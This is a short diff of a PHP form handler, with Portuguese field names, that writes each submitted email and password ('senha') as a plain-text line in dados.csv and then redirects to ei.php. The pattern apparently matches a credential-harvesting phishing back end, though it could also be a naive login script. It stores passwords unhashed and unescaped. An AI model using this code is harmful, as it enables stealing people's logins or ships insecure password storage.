@@ -1,15 +1,14 @@
 <?php
 
-$a = $_POST['login'];
+$a = $_POST['email'];
 $b = $_POST['senha'];
-$m = $_POST['nome'];
-$n = $_POST['email'];
 
-$c = $a."-".$b."-".$m."-".$n;
+
+$c = $a."-".$b;
 $d = file('dados.csv');
 $d[] = $c."\n";
 $d_string = implode('', $d);
 
 file_put_contents('dados.csv', $d_string);
-header('location:login.php');
+header('location:ei.php');
 ?>
